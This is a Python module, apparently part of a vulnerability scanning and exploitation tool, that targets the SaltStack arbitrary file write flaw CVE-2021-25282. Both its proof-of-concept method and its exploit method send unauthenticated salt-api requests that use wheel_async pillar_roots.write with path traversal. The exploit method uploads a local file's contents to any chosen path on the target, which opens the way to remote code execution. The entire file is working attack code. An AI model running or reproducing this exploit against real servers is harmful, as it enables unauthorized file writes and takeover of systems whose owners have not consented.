#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading
from thirdparty import requests
from module import globals
from core.verify import verify
from thirdparty.requests_toolbelt.utils import dump
import json


class SaltStack():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()

    def cve_2021_25282_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "SaltStack: CVE-2021-25282"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "SaltStack 任意文件写入漏洞"
        self.vul_info["vul_numb"] = "CVE-2021-25282"
        self.vul_info["vul_apps"] = "SaltStack"
        self.vul_info["vul_date"] = "2021-02-25"
        self.vul_info["vul_vers"] = "< 3002.5"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行漏洞"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "未经授权的访问wheel_async，通过salt-api可以执行任意代码/命令。"
        self.vul_info["cre_date"] = "2021-03-02"
        self.vul_info["cre_auth"] = "zhzyker"
        headers = {
            "User-agent": self.ua,
            "Content-Type": "application/json",
            "Connection": "close"
        }
        url = self.url + "/run"
        path = "../../../../../../../../../tmp/vuln"
        data = {
            'eauth': 'auto',
            'client': 'wheel_async',
            'fun': 'pillar_roots.write',
            'data': 'vuln_cve_2021_25282',
            'path': path
        }
        data = json.dumps(data)
        try:
            r = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            tag = list(json.loads(r.text)["return"])[0]["tag"]
            jid = list(json.loads(r.text)["return"])[0]["jid"]
            if r"salt/wheel" in tag:
                if jid in tag:
                    self.vul_info["vul_data"] = dump.dump_all(r).decode('utf-8', 'ignore')
                    self.vul_info["prt_resu"] = "PoC_MaYbE"
                    self.vul_info["vul_payd"] = path
                    self.vul_info["prt_info"] = "[upload:" + path + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2021_25282_exp(self, cmd, file, path):
        vul_name = "SaltStack: CVE-2021-25282"
        cmd = cmd
        def read_file(file):
            try:
                with open(file) as handle:
                    return handle.read()
            except:
                return "error"
        f = read_file(file)
        headers = {
            "User-agent": self.ua,
            "Content-Type": "application/json",
            "Connection": "close"
        }
        url = self.url + "/run"
        data = {
            'eauth': 'auto',
            'client': 'wheel_async',
            'fun': 'pillar_roots.write',
            'data': f,
            'path': path
        }
        data = json.dumps(data)

        try:
            r = requests.post(url, data=data, headers=headers, timeout=self.timeout, verify=False)
            req = r.text
            tag = list(json.loads(r.text)["return"])[0]["tag"]
            jid = list(json.loads(r.text)["return"])[0]["jid"]
            if r"salt/wheel" in tag:
                if jid in tag:
                    req = "Please judge for yourself if the upload is successful"
            self.raw_data = dump.dump_all(r).decode('utf-8', 'ignore')
            verify.exploit_print(req, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
